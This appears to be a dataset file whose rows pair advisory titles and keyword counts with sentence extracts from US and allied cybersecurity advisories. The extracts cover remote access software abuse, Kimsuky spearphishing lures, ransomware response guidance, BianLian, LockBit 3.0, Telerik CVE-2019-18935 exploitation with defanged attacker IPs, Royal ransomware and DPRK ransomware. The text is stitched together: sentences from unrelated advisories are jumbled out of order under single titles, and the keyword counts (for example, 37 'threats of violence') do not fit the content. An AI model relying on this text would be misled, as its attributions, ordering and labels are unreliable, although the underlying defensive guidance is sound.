Guide to Securing Remote Access Software,2023-06-06,2,"{'phishing': 2, 'ransomware': 2, 'threats_of_violence': 37, 'malware': 4}","Phishing  T1566  Threat actors have used phishing campaigns to lead victims to download  legitimate RMM software. • Implement a user training program and phishing exercises to raise users’ awareness of the risks  of visiting suspicious websites, clicking on suspicious links, and opening suspicious attachments  [CPG 2 .I]. In this  way, remote access software has become a common, high-value instrument for cyber threat actors, especially  ransomware groups. As such, remote access software— and RMM in  particular—is often used by cybercriminals in ransomware incidents, and in certain APT campaigns. Cyber threat actors are increasingly co-opting these same tools for easy  and broad access to victim systems. This type of intrusion falls into the category of living off the land (LOTL) attacks, where inherently  malicious files, codes, and scripts are unnecessary, and cyber threat actors use tools already present in the  environment to sustain their malicious activity. This enables MSPs or IT help desks to monitor multiple devices and networks  at once, however these same features also make managing multiple intrusions easier for cyber threat actors. Remote access software is particularly appealing to threat actors because the software:  • Does not always trigger security tools. Remote access software enables cyber threat  actors to avoid using or developing custom malware, such as remote access trojans (RATs). The way remote  access products are legitimately used by network administrators is similar to how malicious RATs are used  by threat actors. Threat actors can leverage a portable  executable with local user rights to attack other vulnerable machines within the local intranet or  establish long-term persistent access as a local user service. This could allow a threat actor to download files that  would typically be detected and blocked at the firewall. Remote access software enables threat actors to manage multiple  intrusions at once. In addition, initial access brokers may sell network access to many different  cybercriminals, enabling multiple intrusions to the same network, as well as expanding the reach and ability  of these cyber threat actors. ASSOCIATED TTPS  Cyber threat actors use remote access software for initial access, maintaining persistence, deploying additional  software and tools, lateral movement, and data exfiltration. Threat actors may also obtain legitimate, compromised remote access software credentials that ultimately enable  them to exercise control over remote endpoints associated with the compromised account. Once initial access is  obtained threat actors often use PowerShell or similar command line tools to silently deploy the RMM agent. Often,  threat actors leverage multiple RMM mechanisms at once. Threat actors use remote access software to perform multiple functions and carry out several commonly  associated TTPs (e.g .

CISA and NIST based the CPGs on existing  cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics,  techniques, and procedures. • Monitor their software and terms of service violations by cyber threat actors engaging in computer network intrusions; in particular, free trial versions are often abused by cybercriminal threat actors. Additionally, the authoring agencies recommend developers:  • Incorporate threat modeling into their development processes to identify potential vulnerabilities. • Use advanced monitoring and incident response capabilities, which help to operationalize OT/ ICS threat detection and response for cybersecurity teams lacking expertise/infrastructure or budget to deploy full on-prem OT-specific cyber threat monitoring and management programs.

Further, successful compromises enable Kimsuky actors to craft more credible and effective  spearphishing emails that can be leveraged against more sensitive, higher-value targets. The  authoring agencies believe that raising awareness of some of these campaigns and employing basic  cyber security practices may frustrate the effectiveness of Kimsuky spearphishing operations. If you believe you have been targeted in one of these spearphishing campaigns, whether or not  it resulted in a compromise (particularly if you are a member of one of the targeted sectors),  please file a report with www.ic3.gov and reference #KimsukyCSA in the incident description. Among social engineering techniques, Kimsuky actors  use spearphishing—or the use of fabricated emails and digital communications tailored to deceive a  target—as one of their primary vectors for initiating a compromise and gaining access into a target’s  devices and networks. For over a decade, Kimsuky actors have continued to refine their social  engineering techniques and made their spearphishing efforts increasingly difficult to discern. A Kimsuky spearphishing  campaign begins with  broad research and  preparation. The Kimsuky actors will  create email addresses  that resemble email  addresses of real  individuals they seek to  impersonate and generate  domains that host the  malicious content of a spearphishing message.   For example, Kimsuky actors are known to impersonate well-known news outlets and  journalists using a domain such as “@XYZkoreas.news” spoofing a real news station while  actual emails from the news service appear as “@XYZnews.com.”     DPRK cyber actors commonly take on the identities of real people to gain trust and establish  rapport in their digital communications. They craft convincing spearphishing emails by repurposing the person’s email signature,  contact list, and past email exchanges. DPRK cyber actors are also known to compromise                        Sample of a program for generating DPRK spearphishing emails.   The initial phishing email occasionally contains a malicious link or document, often purporting  to be a report or news article. However, more often, the initial spearphishing email does not contain any  malicious links or attachments and is instead intended to gain the trust of the victim. Notably, victim responses to spearphishing lures also provide Pyongyang with the added benefit of  insight into foreign policy circles.   Actors are persistent if the target does not respond to the initial spearphishing email. FBI | DOS | NSA| NIS | NPA | MOFA TLP:CLEAR  Page 6 of 21  | Product ID: CSA-20230601-1  TLP:CLEAR CAMPAIGNS AND THEMES  Kimsuky cyber actors craft their spearphishing campaigns around themes characterizing the target,  message content, and the malicious mechanism, or lure, through which a compromise is initiated. The following are examples of real Kimsuky spearphishing attempts that illustrate variations of the  common themes. Kimsuky actors commonly pose questions in their spearphishing emails about current  events, such as issues regarding Russia’s invasion of Ukraine; U.S.-DPRK relations; DPRK nuclear  and security topics; policymaker stances on the Asian region; and thoughts on current China-North  Korea and Russia-North Korea relations. Impersonation of academic scholars  Kimsuky actors impersonate South Korean academic scholars to send spearphishing emails to  researchers at think tanks. Impersonation of think tank researchers  Kimsuky actors impersonate researchers from legitimate South Korean think tanks to send  spearphishing emails to political and North Korean experts. FBI | DOS | NSA| NIS | NPA | MOFA TLP:CLEAR  Page 12 of 21  | Product ID: CSA-20230601-1  TLP:CLEAR Sample email communication 6:   Below is an example of Kimsuky actors spoofing a think tank employee and utilizing a spoofed think  tank domain in order to target another think tank employee. The link leads to a phishing site that mimics a legitimate web  portal login page where victims are directed to input personal information, including their usernames  and passwords, for harvesting by DPRK cyber actors. For potential recipients’ systems administrators:    Implement a user training program and phishing exercises to raise awareness among users  about the risks of visiting websites, clicking on links, and opening attachments. Reinforce the  appropriate user response to phishing and spearphishing emails.   Require phishing-resistant multi-factor authentication (MFA) for as many services as  possible—particularly for webmail, virtual private networks (VPNs), accounts that access  critical systems, and privileged accounts that manage backups. After assessing risks, if RDP is deemed  operationally necessary, restrict the originating sources and require phishing-resistant  MFA to mitigate credential theft and reuse.   Enabling DMARC and DKIM on email domains generally makes certain forms of email  spoofing more difficult, though it may not directly mitigate the tactics described above. FBI | DOS | NSA| NIS | NPA | MOFA TLP:CLEAR  Page 19 of 21  | Product ID: CSA-20230601-1  TLP:CLEAR APPENDIX: ADDITIONAL SPEARPHISHING SAMPLES  Sample email communication 10:                        Sample email communication 11:                     “This is <name of legitimate journalist> from <legitimate non-U.S. <Button linking to phishing website disguised as a normal portal login page>    Title: Notification regarding your fraudulent account registration  This is the <legitimate portal site> operation team, and we regret to inform you that your ID  <redacted> has been registered as a fraudulent account. We assess the primary goals of the DPRK regime’s cyber program include maintaining consistent  access to current intelligence about the United States, South Korea, and other countries of interest to  impede any political, military, or economic threat to the regime’s security and stability. Some targeted entities may discount the threat posed by these social engineering campaigns, either  because they do not perceive their research and communications as sensitive in nature, or because  they are not aware of how these efforts fuel the regime’s broader cyber espionage efforts. Although all DPRK advanced persistent threat groups employ social engineering techniques, the  campaigns and themes described in this advisory are specific to Kimsuky. Threat actors use SMB to propagate malware across organizations. Timely patching is one of the most efficient and cost-effective steps an organization can take  to minimize its exposure to cybersecurity threats. Compromise of a target account can lead  to persistent access to a victim’s communications, often through a malware used by Kimsuky  actors called BabyShark. The domains also may be identified as such in open-source  malware repositories like Virus Total. In many instances, Kimsuky actors do not attach malware to their initial email. Even after stealing the account information of their victims and infecting their  devices with malware, they sometimes continue to send “thank you” emails to their targets.   Install and regularly update antivirus and antimalware software on all hosts."

These  security services analyze DNS queries  and take action to mitigate threats— such as malware, ransomware, phishing  attacks, viruses, malicious sites, and  spyware—leveraging the existing DNS  protocol and architecture. These links then lead unsuspecting  users to phishing sites, malware downloads,  and other cyber threats.

Over time, malicious  actors have adjusted their ransomware tactics to  be more destructive and impactful and have  also exfiltrated victim data and pressured  victims to pay by threatening to release the  stolen data. This guide is an update to the Joint  Cybersecurity and Infrastructure Security  Agency (CISA) and Multi-State Information  Sharing & Analysis Center (MS-ISAC)  Ransomware Guide released in September  2020 (see What’s New) and was developed  through the JRTF. Joint Ransomware Task Force (JRTF). The JRTF, co-chaired by CISA and FBI, is an  interagency, collaborative effort to combat the  growing threat of ransomware attacks. The JRTF  was launched in response to a series of high- profile ransomware attacks on U.S. Government's response to ransomware  attacks and facilitates information sharing  and collaboration between government  agencies and private sector partners. •  Ensures operational coordination for activities  such as developing and sharing best  practices for preventing and responding to  ransomware attacks, conducting joint  investigations and operations against  ransomware threat actors, and providing  guidance and resources to organizations that  have been victimized by ransomware. •  Represents a significant step forward in  enabling unity of effort across the U.S  Government's efforts to address the growing  threat of ransomware attacks. For more info on JRTF, see cisa.gov/joint- ransomware-task-force. Engaging with peer organizations and CISA enables your organization to receive critical and timely  information and access to services for managing ransomware and other cyber threats. What’s New  Since the initial release of the Ransomware Guide in September 2020, ransomware actors have  accelerated their tactics and techniques. •  Incorporated the #StopRansomware effort into  the title. •  Expanded the ransomware response checklist with threat hunting tips for detection and  analysis. #StopRansomware is CISA and FBI’s effort  to publish advisories for network defenders  that detail network defense information  related to various ransomware variants and  threat actors. Visit stopransomware.gov to  learn more and to read the joint advisories. It is  important that backups are maintained offline, as many  ransomware variants attempt to find and subsequently  delete or encrypt accessible backups to make  restoration impossible unless the ransom is paid. o Review available incident response guidance, such as the Ransomware Response  Checklist in this guide and Public Power Cyber Incident Response Playbook to:    Help your organization better organize around cyber incident response. These  macros can be used to deliver ransomware [CPG 2.N]. This  enables detection of both “precursor”  malware and ransomware. o A ransomware infection may be  evidence of a previous, unresolved  network compromise. For example, many ransomware infections are the result of  existing malware infections, such as QakBot, Bumblebee, and Emotet. o In some cases, ransomware deployment is the last step in a network compromise and is  dropped to obscure previous post-compromise activities, such as business email  compromise (BEC). •  Consider implementing an intrusion detection system (IDS) to detect command and control  activity and other potentially malicious network activity that occurs prior to ransomware  deployment. MSPs have been an  infection vector for ransomware  impacting numerous client  organizations [CPG 1.I]. • Malicious actors may target MSPs with the goal of  compromising MSP client organizations; they may  use MSP network connections and access to  client organizations as a key vector to propagate  malware and ransomware. Malicious actors often leverage privileged  accounts for network-wide ransomware attacks. Emerging ransomware strategies have  begun targeting VMware ESXi servers, hypervisors, and other centralized tools and systems,  which enables fast encryption of the infrastructure at scale. For more information about  ransomware resilience and hardening of VMware and other virtualization infrastructure, see: o NIST Special Publication (SP 800-125A Rev.1): Security Recommendations for Server- based Hypervisor Platforms o VMware: Cloud Infrastructure Security Configuration & Hardening • Leverage best practices and enable security settings in association with cloud  environments, such as Microsoft Office 365. o Enable delete protection or object lock on storage resources often targeted in  ransomware attacks (e.g., object storage, database storage, file storage, and block  storage) to prevent data from being deleted or overwritten, respectively. Threat actors use PowerShell to deploy  ransomware and hide their malicious activities. Malicious actors often target and use DCs as a staging  point to spread ransomware network wide. Detection and Analysis  Refer to the best practices and references  below to help manage the risk posed by  ransomware and support your organization’s  coordinated and efficient response to a  ransomware incident. Additionally, paying ransoms may pose sanctions  risks. Department of the Treasury Office of  Foreign Assets Control (OFAC) memorandum from  September 2021, Updated Advisory on Potential  Sanctions Risks for Facilitating Ransomware  Payments. Not doing so could cause actors to move laterally to preserve their  access or deploy ransomware widely prior to networks being taken offline. Power down devices if you are unable to disconnect them from the network to avoid  further spread of the ransomware infection. Note: This step will prevent your organization from maintaining ransomware infection artifacts  and potential evidence stored in volatile memory. A ransomware event may be evidence of a previous, unresolved  network compromise. TLP:CLEAR  Page | 21  TLP:CLEAR    Malicious actors often drop ransomware variants to obscure post-compromise  activity. Misuse of these tools is a  common ransomware technique to inhibit system recovery. Reporting and Notification  Note: Refer to the Contact Information  section at the end of this guide for details on  how to report and notify about ransomware  incidents.

Threat actors often gain initial access to a network through exposed and poorly  secured remote services, and later traverse the network using the native Windows RDP client. Threat actors also often gain access by exploiting virtual private networks (VPNs) or using  compromised credentials.   PowerShell logs contain valuable data, including historical OS and registry  interaction and possible tactics, techniques, and procedures of a threat actor’s  PowerShell use. Malicious actors will sometimes use this access to exfiltrate data and  then threaten to release the data publicly before ransoming the network to further  extort the victim and pressure them into paying. Initiate threat hunting activities. Common tools for data  exfiltration include Rclone, Rsync, various web-based file storage services (also  used by threat actors to implant malware/tools on the affected network), and  FTP/SFTP.

PURPOSE  This document was developed in furtherance of the authors’ cybersecurity missions, including their  responsibilities to identify and disseminate threats, and to develop and issue cybersecurity  specifications and mitigations. Malicious actors use SMB to propagate malware across  organizations, so then harden SMBv3:  o Block or limit internal SMB traffic to systems that require access. •  Enable common attachment filters to restrict file types that commonly contain malware  and should not be sent by email. For more information, refer to Microsoft’s post Anti-malware  protection in EOP. o Malware is often compressed in password protected archives that evade antivirus  scanning and email filters. TLP:CLEAR  Page | 11  TLP:CLEAR  Initial Access Vector: Precursor Malware Infection  •  Use automatic updates for your antivirus  and anti-malware software and  signatures. •  Monitor indicators of activity and block malware file creation with the Windows Sysmon  utility. •  Consider implementing sandboxed  browsers to protect systems from  malware originating from web browsing. Malicious  actors use drive-by downloads to steal and  collect personal information, inject trojans, or  introduce exploit kits or other malware to  endpoints. • “Malvertising”: malicious advertising that  cybercriminals use to inject malware to users’  computers when they visit malicious  websites or click an online advertisement. Malvertising may also direct users to a  corrupted website where their data can be  stolen, or malware can be downloaded onto  their computer.   The authoring organizations recommend using Windows Server 2019 or greater  and Windows 10 or greater as they have security features, such as LSASS  protections with Windows Credential Guard, Windows Defender, and  Antimalware Scan Interface (AMSI), not included in older operating system  o Ensure that DCs are regularly patched.

In 2023, FBI observed BianLian shift to primarily exfiltration- based extortion with victims’ systems left intact, and ACSC observed BianLian shift exclusively to  exfiltration-based extortion. Exfiltration and Impact  BianLian group actors search for sensitive files using PowerShell scripts (See Appendix: Windows  PowerShell and Command Shell Activity) and exfiltrate them for data extortion. Prior to January 2023,  BianLian actors encrypted files [T1486] after exfiltration for double extortion.

In addition, FBI, CISA, and ACSC recommend network defenders apply the following mitigations to  limit potential adversarial use of common system and network discovery techniques and to reduce the  impact and risk of compromise by ransomware or data extortion actors:  •  Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary  data and servers in a physically separate, segmented, and secure location (e.g., hard drive,  storage device, or the cloud). Product ID: AA23-136A May 16, 2023 Co-Authored by:  TLP:CLEAR TLP:CLEAR  #StopRansomware: BianLian Ransomware  Group  SUMMARY  Note: This joint Cybersecurity Advisory (CSA) is part of an  ongoing #StopRansomware effort to publish advisories for  network defenders that detail various ransomware variants  and ransomware threat actors. These #StopRansomware  advisories include recently and historically observed tactics,  techniques, and procedures (TTPs) and indicators of  compromise (IOCs) to help organizations protect against  ransomware. Visit stopransomware.gov to see all  #StopRansomware advisories and learn more about other  ransomware threats and no-cost resources. FBI, CISA, and ACSC encourage critical infrastructure organizations and small- and medium-sized  organizations to implement the recommendations in the Mitigations section of this advisory to reduce  the likelihood and impact of BianLian and other ransomware incidents. •  Segment networks to prevent the spread of ransomware. Network segmentation can help  prevent the spread of ransomware by controlling traffic flows between—and access to— various subnetworks, restricting further lateral movement [CPG 2.F]. •  Identify, detect, and investigate abnormal activity and potential traversal of the  indicated ransomware with a networking monitoring tool. To aid in detecting ransomware,  implement a tool that logs and reports all network traffic, including lateral movement activity on  a network. RESOURCES  •  Stopransomware.gov, a whole-of-government approach with one central location for U.S. ransomware resources and alerts. •  cyber.gov.au for the Australian Government’s central location to report cyber incidents,  including ransomware, and to see advice and alerts. The site also provides ransomware  advisories for businesses and organizations to help mitigate cyber threats. •  CISA-Multi-State Information Sharing and Analysis Center (MS-ISAC) Joint Ransomware  Guide for guidance on mitigating and responding to a ransomware attack  •  For no-cost cyber hygiene services for U.S. organizations,  Cyber Hygiene Services and  Ransomware Readiness Assessment. Furthermore, payment may also embolden adversaries to target additional  organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or  fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom,  the FBI and CISA urge you to promptly report ransomware incidents to a local FBI Field Office or  CISA at cisa.gov/report. Australian organizations that have been impacted or require assistance in  regard to a ransomware incident can contact ACSC via 1300 CYBER1 (1300 292 371) or by  submitting a report cyber.gov.au. To request incident response resources or technical assistance  related to these threats, contact CISA at Report@cisa.dhs.gov.

Employees of victim  companies also reported receiving threatening telephone calls from individuals associated with  BianLian group. MITRE ATT&CK TECHNIQUES  See Table 2 for all referenced threat actor tactics and techniques in this advisory. MITIGATIONS  FBI, CISA, and ACSC recommend organizations implement the mitigations below to improve your  organization’s cybersecurity posture on the basis of the threat actors’ activity. CISA and NIST based the  CPGs on existing cybersecurity frameworks and guidance to protect against the most common and  impactful threats and TTPs. •  Reduce threat of malicious actors using remote access tools by:  o Auditing remote access tools on your network to identify currently used and/or  authorized software. o PowerShell logs contain valuable data, including historical OS and registry interaction  and possible TTPs of a threat actor’s PowerShell use. •  Reduce the threat of credential compromise via the following:  o Place domain admin accounts in the protected users’ group to prevent caching of  password hashes locally. Timely patching is one of  the most efficient and cost-effective steps an organization can take to minimize its exposure to  cybersecurity threats. VALIDATE SECURITY CONTROLS  In addition to applying mitigations, FBI, CISA, and ACSC recommend exercising, testing, and  validating your organization's security program against the threat behaviors mapped to the MITRE  ATT&CK for Enterprise framework in this advisory. Defense Evasion  BianLian group actors use PowerShell [T1059.001] and Windows Command Shell [T1059.003] to  disable antivirus tools [T1562.001], specifically Windows defender and Anti-Malware Scan Interface  (AMSI).

The LockBit 3.0 ransomware operations function as a Ransomware-as-a-Service (RaaS) model and is  a continuation of previous versions of the ransomware, LockBit 2.0, and LockBit. Since January 2020,  LockBit has functioned as an affiliate-based ransomware variant; affiliates deploying the LockBit RaaS  use many varying TTPs and attack a wide range of businesses and critical infrastructure organizations,  which can make effective computer network defense and mitigation challenging. The FBI, CISA, and the MS-ISAC encourage organizations to implement the recommendations in the  mitigations section of this CSA to reduce the likelihood and impact of ransomware incidents. Actions to take today to mitigate  cyber threats from ransomware:   • Prioritize remediating known  exploited vulnerabilities. CAPABILITIES  LockBit 3.0, also known as “LockBit Black,” is more modular and evasive than its previous versions  and shares similarities with Blackmatter and Blackcat ransomware. LockBit 3.0 is configured upon compilation with many different options that determine the behavior of  the ransomware. Upon the actual execution of the ransomware within a victim environment, various  arguments can be supplied to further modify the behavior of the ransomware. If a LockBit affiliate  does not have access to passwordless LockBit 3.0 ransomware, then a password argument is  mandatory during the execution of the ransomware. LockBit 3.0 affiliates failing to enter the correct  password will be unable to execute the ransomware [T1480.001]. When provided the correct password, LockBit 3.0 will decrypt the main  component, continue to decrypt or decompress its code, and execute the ransomware. After files are encrypted, LockBit 3.0 drops a ransom note with the new filename <Ransomware  ID>.README.txt and changes the host’s wallpaper and icons to LockBit 3.0 branding [T1491.001].

Threat Actors Exploit Progress Telerik Vulnerability in U.S. Government IIS Server,2023-03-15,1,"{'phishing': 1, 'threats_of_violence': 28, 'malware': 10}","Other Best Practice Mitigation Recommendations  •  Implement phishing-resistant multifactor authentication (MFA) for as many services  possible—particularly for webmail, virtual private networks (VPNs), accounts that access  critical systems, and privileged accounts that manage backups. TLP:CLEAR  Product ID: AA23-074A March 15, 2023 Co-Authored by:  TLP:CLEAR  Threat Actors Exploit Progress Telerik  Vulnerability in U.S. Analysts determined that multiple cyber threat actors,  including an APT actor, were able to exploit a .NET  deserialization vulnerability (CVE-2019-18935) in  Progress Telerik user interface (UI) for ASP.NET  AJAX, located in the agency’s Microsoft Internet  Information Services (IIS) web server. See the MITRE  ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE  ATT&CK tactics and techniques with corresponding detection and mitigation recommendations. Overview  CISA and authoring organizations assess that, beginning as late as November 2022, threat actors  successfully exploited a .NET deserialization vulnerability (CVE-2019-18935) in an instance of Telerik  UI for ASP.NET AJAX Q2 2013 SP1 (version 2013.2.717) running on an FCEB agency’s Microsoft IIS  server. This exploit, which results in interactive access with the web server, enabled the threat actors  to successfully execute remote code on the vulnerable web server. Analysis suggests that cyber threat actors exploited CVE-2019-18935 in conjunction with either CVE- 2017-11357 or CVE-2017-11317. Australian Cyber Security Centre (ACSC) Advisory 2020-004  assesses that exploitation of CVE-2019-18935 is only possible with knowledge of Telerik  RadAsyncUpload encryption keys.[2] Threat actors can obtain these keys through either prior  knowledge or exploitation of vulnerabilities—CVE-2017-11357 or CVE-2017-11317—present in older,  unpatched versions of Telerik released between 2007 and 2017. Threat Actor Activity  CISA and authoring organizations observed multiple cyber threat actors, including an APT actor— hereafter referred to as Threat Actor 1 (TA1)—and known cybercriminal actor XE Group—hereafter  referred to as Threat Actor 2 (TA2)—conducting reconnaissance and scanning activities [T1595.002]  that correlate to the successful exploitation of CVE-2019-18935 in the agency’s IIS server running  Telerik UI for ASP.NET AJAX [T1190]. When exploiting the vulnerability, the threat actors uploaded malicious dynamic-link library (DLL) files  (some masqueraded as portable network graphics [PNG] files) [T1105] to the C:\Windows\Temp\  directory. CISA and authoring organizations confirmed that some malicious files dropped on the IIS server are  consistent with a previously reported file naming convention that threat actors commonly use when  exploiting CVE-2019-18935.[3] The threat actors name the files in the Unix Epoch time format and  use the date and time as recorded on the target system. The uncorrelated Unix Epoch time format may  indicate that the threat actors used the timestomping [T1070.006] technique. This file naming  convention is a primary IOC used by the threat actors. In many cases, malicious artifacts were not available for analysis because the threat actors’  malware—that looks for and removes files with the .dll file extension—removed files [T1070.004] from  the C:\Windows\Temp\ directory. CISA and authoring organizations observed error messages  being sent to the threat actors’ command and control (C2) server when permission restraints  prevented the service account from executing the malicious DLLs and writing new files. Threat Actor 1  CISA and authoring organizations observed TA1 exploiting CVE-2019-18935 for system enumeration  beginning in August 2022. The vulnerability allows a threat actor to upload malicious DLLs on a target  system and execute them by abusing a legitimate process, e.g., the w3wp.exe process. CISA, in coordination with the authoring organizations, identified and observed the following threat  actor IPs and timestamps associated with this activity:  Table 1: Observed TA1 IPs and Timestamps         CISA | FBI | MS-ISAC TLP:CLEAR Page 4 of 17  |  Product ID: AA23-074A  TLP:CLEAR  IP Address  First Identified  Last Identified  137.184.130[.]162  09/26/2022  10/08/2022  45.77.212[.]12  10/07/2022  11/25/2022  104.225.129[.]102  10/10/2022  11/16/2022  149.28.85[.]24  10/12/2022  10/17/2022  185.186.245[.]72  10/18/2022  10/18/2022  193.8.172[.]113  09/25/2022  09/25/2022  193.8.172[.]13  09/25/2022  10/17/2022  216.120.201[.]12  10/13/2022  11/10/2022  5.34.178[.]246  09/25/2022  09/25/2022  79.133.124[.]242  09/25/2022  09/25/2022  92.38.169[.]193  09/27/2022  10/08/2022  92.38.176[.]109  09/12/2022  09/25/2022  92.38.176[.]130  09/25/2022  10/07/2022  Threat Actor 2  TA2—identified as likely the cybercriminal actor XE Group—often includes xe[word] nomenclature in  original filenames and registered domains. Volexity lists this naming convention and other observed  TTPs as common for this threat actor group.[4]  As early as August 2021, CISA and authoring organizations observed TA2 delivering malicious PNG  files that, following analysis, were masqueraded DLL files to avoid detection [T1036.005]. Note: It is likely the threat actors changed the file extension from .dll  to .png to avoid detection. •  The C2 server may send the command xequit, causing the malware to sleep for a period  of time determined by the threat actors. MITRE ATT&CK TACTICS AND TECHNIQUES  See Table 4 for all referenced threat actor tactics and techniques in this advisory. Forensic analysis commonly identified the threat actors taking the following steps:         CISA | FBI | MS-ISAC TLP:CLEAR Page 10 of 17  |  Product ID: AA23-074A  TLP:CLEAR  1. As presented by Bishop Fox  and proven during authoring organizations’ investigation of IIS server logs, an exception  does not mean that the exploit failed, but more likely that it executed successfully.[3]    Figure 1: Threat Actor Assembly Installer         CISA | FBI | MS-ISAC TLP:CLEAR Page 13 of 17  |  Product ID: AA23-074A  TLP:CLEAR  If a Werfault crash report was written, Windows event application logs may contain evidence of this—  even if the DLLs have been removed from the system as part of a cleanup effort by the threat actors.

Initial Access  Royal actors gain initial access to victim networks in a number of ways including:   •  Phishing. According to third-party reporting, Royal actors most commonly (in 66.7% of  incidents) gain initial access to victim networks via successful phishing emails [T1566]. o According to open-source reporting, victims have unknowingly installed malware that  delivers Royal ransomware after receiving phishing emails containing malicious PDF  documents [T1566.001], and malvertising [T1566.002].[2]  •  Remote Desktop Protocol (RDP). Phishing: Spear phishing  Attachment  T1566.001  The actors gain initial access through malicious  PDF attachments sent via email. Phishing: Spearphishing Link  T1566.002  The actors gain initial access using  malvertising links via emails and public-facing  sites. Royal  actors have made ransom demands ranging from approximately $1 million to $11 million USD in  Bitcoin. This approach allows the actor to lower the encryption  percentage for larger files, which helps evade detection.[1] In addition to encrypting files, Royal actors  also engage in double extortion tactics in which they threaten to publicly release the encrypted data if  the victim does not pay the ransom.

The Federal Bureau of Investigation (FBI) and the Cybersecurity and Infrastructure Security Agency  (CISA) are releasing this joint CSA to disseminate known Royal ransomware IOCs and TTPs  identified through FBI threat response activities as recently as January 2023. and international  organizations with a Royal ransomware variant. After gaining access to victims’ networks, Royal actors disable antivirus software and exfiltrate large  amounts of data before ultimately deploying the ransomware and encrypting the systems. FBI and CISA encourage organizations to implement the recommendations in the Mitigations section  of this CSA to reduce the likelihood and impact of ransomware incidents. Actions to take today to  mitigate cyber threats from  ransomware:   •  Prioritize remediating known  exploited vulnerabilities. Royal ransomware uses a unique partial encryption approach that allows the threat actor to choose a  specific percentage of data in a file to encrypt. Ransomware operators often use  open-source projects to aid their intrusion activities; Royal operators have recently been observed  using Chisel, a tunneling tool transported over HTTP and secured via SSH [T1572], to communicate  with their C2 infrastructure. FBI has observed multiple Qakbot C2s used in Royal ransomware  attacks, but has not yet determined if Royal ransomware exclusively uses Qakbot C2s. Batch files create a new admin user [T1078.002], force a group policy update, set  pertinent registry keys to auto-extract [T1119] and execute the ransomware, monitor the encryption  process, and delete files upon completion—including Application, System, and Security event logs  [T1070.001]. Malicious files have been found in victim networks in the following directories:  •  C:\Temp\    •  C:\Users\<user>\AppData\Roaming\    •  C:\Users\<users>\   •  C:\ProgramData\  Indicators of Compromise (IOC)  See table 1 and 2 for Royal ransomware IOCs that FBI obtained during threat response activities as  of January 2023.

MITIGATIONS  FBI and CISA recommend network defenders apply the following mitigations to limit potential  adversarial use of common system and network discovery techniques and to reduce the risk of  compromise by Royal ransomware. Network segmentation can help prevent the spread of  ransomware by controlling traffic flows between—and access to—various subnetworks and by  restricting adversary lateral movement. •  Identify, detect, and investigate abnormal activity and potential traversal of the  indicated ransomware with a networking monitoring tool. To aid in detecting ransomware,  implement a tool that logs and reports all network traffic [CPG 5.1], including lateral movement  activity on a network.

Furthermore, payment may also embolden adversaries to target additional organizations,  encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit  activities. Regardless of whether you or your organization have decided to pay the ransom, FBI and  CISA urge you to promptly report ransomware incidents to a local FBI Field Office, or CISA at  https://www.cisa.gov/report.

To request incident response resources  or technical assistance related to these threats, contact CISA at Report@cisa.dhs.gov. Instead, the note, which appears after encryption, requires victims to  directly interact with the threat actor via a .onion URL (reachable through the Tor browser). Once on the domain controller, the threat actor deactivated  antivirus protocols [T1562.001] by modifying Group Policy Objects [T1484.001]. These mitigations follow CISA’s Cybersecurity Performance  Goals (CPGs), which provide a minimum set of practices and protections that are informed by the  most common and impactful threats, tactics, techniques, and procedures, and which yield goals that  all organizations across critical infrastructure sectors should implement:  •  Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary  data and servers [CPG 7.3] in a physically separate, segmented, and secure location (i.e.,  hard drive, storage device, the cloud). Timely patching is one of  the most efficient and cost-effective steps an organization can take to minimize its exposure to  cybersecurity threats. If threat  actors are not able to run these tools, they will have difficulty escalating privileges and/or  moving laterally.

Reinforce the appropriate user response to  phishing and spearphishing emails.  Require phishing-resistant MFA for as many services as possible [CPG  1.3]—particularly for webmail, VPNs, accounts that access critical systems, and  privileged accounts that manage backups. o Organizations should also ensure their incident response and  communications plans include data breach incidents response and  notification procedures. o See the CISA-Multi-State Information Sharing and Analysis Center (MS- ISAC) Joint Ransomware Guide and CISA Fact Sheet Protecting Sensitive  and Personal Information from Ransomware-Caused Data Breaches for  information on creating a ransomware response checklist and planning  and responding to ransomware-caused data breaches. 1.0  Cybersecurity Advisory  TLP:CLEAR TLP:CLEAR #StopRansomware: Ransomware Attacks on Critical  Infrastructure Fund DPRK Malicious Cyber Activities  Summary  Note: This Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort  to publish advisories for network defenders that detail various ransomware variants and  various ransomware threat actors. These #StopRansomware advisories detail  historically and recently observed tactics, techniques, and procedures (TTPs) and  indicators of compromise (IOCs) to help organizations protect against ransomware. Visit  stopransomware.gov to see all #StopRansomware advisories and to learn about other  ransomware threats and no-cost resources. Department of Health and Human Services (HHS), the Republic of Korea  (ROK) National Intelligence Service (NIS), and the ROK Defense Security Agency  (DSA) (hereafter referred to as the “authoring agencies”) are issuing this joint  Cybersecurity Advisory (CSA) to highlight ongoing ransomware activity against  Healthcare and Public Health Sector organizations and other critical infrastructure  sector entities. This CSA provides an overview of Democratic People’s Republic of Korea (DPRK)  state-sponsored ransomware and updates the July 6, 2022, joint CSA North Korean  State-Sponsored Cyber Actors Use Maui Ransomware to Target the Healthcare and  Public Health Sector. This advisory highlights TTPs and IOCs DPRK cyber actors used  to gain access to and conduct ransomware attacks against Healthcare and Public  Health (HPH) Sector organizations and other critical infrastructure sector entities, as  well as DPRK cyber actors’ use of cryptocurrency to demand ransoms. 1.0   Ransomware Attacks on Critical Infrastructure Fund DPRK Malicious Cyber Activities  2  TLP:CLEAR TLP:CLEAR The authoring agencies assess that an unspecified amount of revenue from these  cryptocurrency operations supports DPRK national-level priorities and objectives,  including cyber operations targeting the United States and South Korea governments— specific targets include Department of Defense Information Networks and Defense  Industrial Base member networks. The authoring agencies highly discourage  paying ransoms as doing so does not guarantee files and records will be recovered and  may pose sanctions risks. This CSA is supplementary to previous reports on malicious cyber actor activities  involving DPRK ransomware campaigns—namely Maui and H0lyGh0st ransomware. The authoring agencies are issuing this advisory to highlight additional observed TTPs  DPRK cyber actors are using to conduct ransomware attacks targeting South Korean  and U.S. Observable TTPs  The TTPs associated with DPRK ransomware attacks include those traditionally  observed in ransomware operations. DPRK actors generate domains, personas, and  accounts; and identify cryptocurrency services to conduct their ransomware  operations. Actors procure infrastructure, IP addresses, and domains with  cryptocurrency generated through illicit cybercrime, such as ransomware and  